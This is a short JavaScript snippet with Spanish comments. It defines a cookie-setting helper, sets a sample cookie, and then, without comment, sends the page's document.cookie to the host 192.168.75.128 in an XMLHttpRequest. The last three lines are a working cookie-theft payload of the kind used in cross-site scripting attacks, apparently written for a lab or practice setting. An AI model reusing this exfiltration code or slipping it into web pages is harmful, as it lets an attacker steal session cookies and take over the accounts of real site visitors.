// Función para establecer una cookie
function setCookie(nombre, valor, diasParaExpirar) {
    var fechaExpiracion = new Date();
    fechaExpiracion.setTime(fechaExpiracion.getTime() + (diasParaExpirar * 24 * 60 * 60 * 1000));
    var expiracion = "expires=" + fechaExpiracion.toUTCString();
    document.cookie = nombre + "=" + valor + "; " + expiracion + "; path=/";
  }
  
  // Ejemplo de uso: establecer una cookie llamada "miCookie" con valor "ejemplo" que expira en 30 días
  setCookie("miCookie", "ejemplo", 30);
  


var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.75.128/?cookie=' + document.cookie);
request.send()
